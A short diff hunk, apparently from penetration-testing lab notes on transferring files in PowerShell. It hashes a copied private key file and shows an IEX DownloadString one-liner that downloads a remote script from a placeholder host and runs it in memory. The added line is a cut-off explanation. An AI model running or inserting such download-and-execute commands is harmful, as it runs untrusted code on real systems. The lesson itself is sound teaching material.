@@ -52,3 +52,5 @@ PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
 ```
+
+- `DownloadString()` downloads the sc
